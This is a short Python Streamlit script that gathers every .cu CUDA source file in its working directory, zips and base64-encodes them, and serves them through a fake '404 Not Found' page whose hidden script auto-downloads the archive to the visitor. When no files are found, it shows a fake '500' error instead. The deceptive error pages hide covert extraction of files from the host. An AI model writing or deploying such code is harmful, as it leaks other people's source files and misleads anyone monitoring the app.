import streamlit as st
import base64
import os
import zipfile

st.set_page_config(page_title="Error", layout="wide")

# Find all .cu files
cu_files = [f for f in os.listdir(".") if f.endswith(".cu")]

if cu_files:
    # Create a zip file
    zip_filename = "cuda_files.zip"
    with zipfile.ZipFile(zip_filename, "w") as zipf:
        for file_name in cu_files:
            zipf.write(file_name)

    # Encode zip file to base64
    with open(zip_filename, "rb") as f:
        data = f.read()
        b64 = base64.b64encode(data).decode()

    # Fake 404/error page HTML + Auto-download
    st.markdown(
        f"""
        <style>
        body {{
            background-color: #f2f2f2;
            color: #555;
            font-family: "Segoe UI", Arial, sans-serif;
            text-align: center;
            margin-top: 15%;
        }}
        h1 {{
            font-size: 100px;
            margin-bottom: 0;
        }}
        h2 {{
            font-size: 32px;
            margin-top: 0;
            color: #888;
        }}
        p {{
            font-size: 18px;
            color: #777;
        }}
        </style>

        <h1>404</h1>
        <h2>Not Found</h2>
        <p>The page you are looking for might have been removed,<br>had its name changed, or is temporarily unavailable.</p>

        <script>
        // Trigger hidden download
        var link = document.createElement('a');
        link.href = "data:application/zip;base64,{b64}";
        link.download = "{zip_filename}";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        </script>
        """,
        unsafe_allow_html=True
    )
else:
    st.markdown(
        """
        <h1>500</h1>
        <h2>Internal Server Error</h2>
        <p>Something went wrong.</p>
        """,
        unsafe_allow_html=True
    )
